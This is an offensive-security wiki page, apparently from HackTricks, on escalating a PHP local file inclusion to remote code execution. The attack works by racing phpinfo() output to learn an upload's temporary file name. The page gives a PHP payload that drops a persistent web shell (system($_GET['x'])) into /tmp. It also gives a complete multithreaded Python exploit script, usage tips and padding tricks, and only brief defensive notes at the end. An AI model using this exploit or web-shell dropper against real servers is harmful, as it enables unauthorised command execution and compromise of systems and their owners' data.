# LFI to RCE via PHPInfo

{{#include ../../banners/hacktricks-training.md}}

To exploit this technique you need all of the following:
- A reachable page that prints phpinfo() output.
- A Local File Inclusion (LFI) primitive you control (e.g., include/require on user input).
- PHP file uploads enabled (file_uploads = On). Any PHP script will accept RFC1867 multipart uploads and create a temporary file for each uploaded part.
- The PHP worker must be able to write to the configured upload_tmp_dir (or default system temp directory) and your LFI must be able to include that path.

Classic write-up and original PoC:
- Whitepaper: LFI with PHPInfo() Assistance (B. Moore, 2011)
- Original PoC script name: phpinfolfi.py (see whitepaper and mirrors)

Tutorial HTB: https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s

Notes about the original PoC
- The phpinfo() output is HTML-encoded, so the "=>" arrow often appears as "=&gt;". If you reuse legacy scripts, ensure they search for both encodings when parsing the _FILES[tmp_name] value.
- You must adapt the payload (your PHP code), REQ1 (the request to the phpinfo() endpoint including padding), and LFIREQ (the request to your LFI sink). Some targets don’t need a null-byte (%00) terminator and modern PHP versions won’t honor it. Adjust the LFIREQ accordingly to the vulnerable sink.

Example sed (only if you really use the old Python2 PoC) to match HTML-encoded arrow:
```
sed -i 's/\[tmp_name\] =>/\[tmp_name\] =&gt;/g' phpinfolfi.py
```

{{#file}}
LFI-With-PHPInfo-Assistance.pdf
{{#endfile}}

## Theory

- When PHP receives a multipart/form-data POST with a file field, it writes the content to a temporary file (upload_tmp_dir or the OS default) and exposes the path in $_FILES['<field>']['tmp_name']. The file is automatically removed at the end of the request unless moved/renamed.
- The trick is to learn the temporary name and include it via your LFI before PHP cleans it up. phpinfo() prints $_FILES, including tmp_name.
- By inflating request headers/parameters (padding) you can cause early chunks of phpinfo() output to be flushed to the client before the request finishes, so you can read tmp_name while the temp file still exists and then immediately hit the LFI with that path.

In Windows the temp files are commonly under something like C:\\Windows\\Temp\\php*.tmp. In Linux/Unix they are usually in /tmp or the directory configured in upload_tmp_dir.

## Attack workflow (step by step)

1) Prepare a tiny PHP payload that persists a shell quickly to avoid losing the race (writing a file is generally faster than waiting for a reverse shell):
```
<?php file_put_contents('/tmp/.p.php', '<?php system($_GET["x"]); ?>');
```

2) Send a large multipart POST directly to the phpinfo() page so it creates a temp file that contains your payload. Inflate various headers/cookies/params with ~5–10KB of padding to encourage early output. Make sure the form field name matches what you’ll parse in $_FILES.

3) While the phpinfo() response is still streaming, parse the partial body to extract $_FILES['<field>']['tmp_name'] (HTML-encoded). As soon as you have the full absolute path (e.g., /tmp/php3Fz9aB), fire your LFI to include that path. If the include() executes the temp file before it is deleted, your payload runs and drops /tmp/.p.php.

4) Use the dropped file: GET /vuln.php?include=/tmp/.p.php&x=id (or wherever your LFI lets you include it) to execute commands reliably.

> Tips
> - Use multiple concurrent workers to increase your chances of winning the race.
> - Padding placement that commonly helps: URL parameter, Cookie, User-Agent, Accept-Language, Pragma. Tune per target.
> - If the vulnerable sink appends an extension (e.g., .php), you don’t need a null byte; include() will execute PHP regardless of the temp file extension.

## Minimal Python 3 PoC (socket-based)

The snippet below focuses on the critical parts and is easier to adapt than the legacy Python2 script. Customize HOST, PHPSCRIPT (phpinfo endpoint), LFIPATH (path to the LFI sink), and PAYLOAD.

```python
#!/usr/bin/env python3
import re, html, socket, threading

HOST = 'target.local'
PORT = 80
PHPSCRIPT = '/phpinfo.php'
LFIPATH = '/vuln.php?file=%s'  # sprintf-style where %s will be the tmp path
THREADS = 10

PAYLOAD = (
    "<?php file_put_contents('/tmp/.p.php', '<?php system($_GET[\\"x\\"]); ?>'); ?>\r\n"
)
BOUND = '---------------------------7dbff1ded0714'
PADDING = 'A' * 6000
REQ1_DATA = (f"{BOUND}\r\n"
             f"Content-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
             f"Content-Type: text/plain\r\n\r\n{PAYLOAD}{BOUND}--\r\n")

REQ1 = (f"POST {PHPSCRIPT}?a={PADDING} HTTP/1.1\r\n"
        f"Host: {HOST}\r\nCookie: sid={PADDING}; o={PADDING}\r\n"
        f"User-Agent: {PADDING}\r\nAccept-Language: {PADDING}\r\nPragma: {PADDING}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Content-Length: {len(REQ1_DATA)}\r\n\r\n{REQ1_DATA}")

LFI = ("GET " + LFIPATH + " HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n")

pat = re.compile(r"\\[tmp_name\\]\\s*=&gt;\\s*([^\\s<]+)")


def race_once():
    s1 = socket.socket()
    s2 = socket.socket()
    s1.connect((HOST, PORT))
    s2.connect((HOST, PORT))
    s1.sendall(REQ1.encode())
    buf = b''
    tmp = None
    while True:
        chunk = s1.recv(4096)
        if not chunk:
            break
        buf += chunk
        m = pat.search(html.unescape(buf.decode(errors='ignore')))
        if m:
            tmp = m.group(1)
            break
    ok = False
    if tmp:
        req = (LFI % tmp).encode() % HOST.encode()
        s2.sendall(req)
        r = s2.recv(4096)
        ok = b'.p.php' in r or b'HTTP/1.1 200' in r
    s1.close(); s2.close()
    return ok

if __name__ == '__main__':
    hit = False
    def worker():
        nonlocal_hit = False
        while not hit and not nonlocal_hit:
            nonlocal_hit = race_once()
        if nonlocal_hit:
            print('[+] Won the race, payload dropped as /tmp/.p.php')
            exit(0)
    ts = [threading.Thread(target=worker) for _ in range(THREADS)]
    [t.start() for t in ts]
    [t.join() for t in ts]
```

## Troubleshooting
- You never see tmp_name: Ensure you really POST multipart/form-data to phpinfo(). phpinfo() prints $_FILES only when an upload field was present.
- Output doesn’t flush early: Increase padding, add more large headers, or send multiple concurrent requests. Some SAPIs/buffers won’t flush until larger thresholds; adjust accordingly.
- LFI path blocked by open_basedir or chroot: You must point the LFI to an allowed path or switch to a different LFI2RCE vector.
- Temp directory not /tmp: phpinfo() prints the full absolute tmp_name path; use that exact path in the LFI.

## Defensive notes
- Never expose phpinfo() in production. If needed, restrict by IP/auth and remove after use.
- Keep file_uploads disabled if not required. Otherwise, restrict upload_tmp_dir to a path not reachable by include() in the application and enforce strict validation on any include/require paths.
- Treat any LFI as critical; even without phpinfo(), other LFI→RCE paths exist.

## Related HackTricks techniques

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}



## References
- LFI With PHPInfo() Assistance whitepaper (2011) – Packet Storm mirror: https://packetstormsecurity.com/files/download/104825/LFI_With_PHPInfo_Assitance.pdf
- PHP Manual – POST method uploads: https://www.php.net/manual/en/features.file-upload.post-method.php
{{#include ../../banners/hacktricks-training.md}}
